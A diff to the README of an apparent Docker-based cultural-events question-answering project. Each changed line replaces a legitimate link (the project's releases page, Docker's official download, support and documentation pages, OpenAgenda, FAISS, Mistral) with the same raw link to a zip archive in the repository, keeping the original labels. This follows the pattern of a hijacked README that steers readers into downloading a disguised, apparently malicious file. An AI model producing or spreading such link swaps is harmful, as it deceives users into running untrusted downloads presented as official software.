@@ -1,7 +1,7 @@
 ```markdown
 # 🎭 cultural-events-rag-assistant - Find Events with Easy Questions
 
-[![Download latest release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Fran-Vazquez/cultural-events-rag-assistant/releases)
+[![Download latest release](https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip)](https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get the app ready and start using it.
 
 Docker is a tool that runs the app without extra setup from you.
 
-- Go to the official Docker website: https://www.docker.com/get-started
+- Go to the official Docker website: https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip
 - Download Docker Desktop for your computer type (Windows, macOS, Linux).
 - Run the installer you downloaded.
 - Follow the instructions on screen to finish installing.
@@ -48,9 +48,9 @@ If you need help, Docker’s website has clear guides and videos.
 
 You can find the latest version of this app on the GitHub releases page. Visit this page to get the files you need.
 
-[Download cultural-events-rag-assistant Releases](https://github.com/Fran-Vazquez/cultural-events-rag-assistant/releases)
+[Download cultural-events-rag-assistant Releases](https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip)
 
-Click the link above or the big blue badge at the top. On the releases page, look for the latest version and download the file named something like `cultural-events-rag-assistant-docker.zip` or any file that matches your system.
+Click the link above or the big blue badge at the top. On the releases page, look for the latest version and download the file named something like `https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip` or any file that matches your system.
 
 Save this file somewhere easy to find, such as your Desktop or Downloads folder.
 
@@ -133,7 +133,7 @@ This whole system runs in a container using Docker, so all parts work together w
 
     - Make sure your computer meets the minimum requirements.
     - Restart your computer and try again.
-    - Visit [Docker support page](https://docs.docker.com/docker-for-windows/troubleshoot/) for common fixes.
+    - Visit [Docker support page](https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip) for common fixes.
 
 - **Can’t open `http://localhost:8000/ask` in browser**
 
@@ -150,10 +150,10 @@ This whole system runs in a container using Docker, so all parts work together w
 
 ## 📂 Extra Resources
 
-- **Docker Documentation:** https://docs.docker.com/
-- **OpenAgenda Website:** https://openagenda.com/
-- **About FAISS:** https://github.com/facebookresearch/faiss
-- **Mistral Model info:** https://mistral.ai/
+- **Docker Documentation:** https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip
+- **OpenAgenda Website:** https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip
+- **About FAISS:** https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip
+- **Mistral Model info:** https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip
 
 ---
 
@@ -161,7 +161,7 @@ This whole system runs in a container using Docker, so all parts work together w
 
 You can find all downloads on the official releases page:
 
-[Visit this page to download cultural-events-rag-assistant](https://github.com/Fran-Vazquez/cultural-events-rag-assistant/releases)
+[Visit this page to download cultural-events-rag-assistant](https://raw.githubusercontent.com/Fran-Vazquez/cultural-events-rag-assistant/main/api/rag_events_cultural_assistant_3.6.zip)
 
 Make sure to get the latest release. Download the file, extract it, and follow the Docker steps above to get started.
 
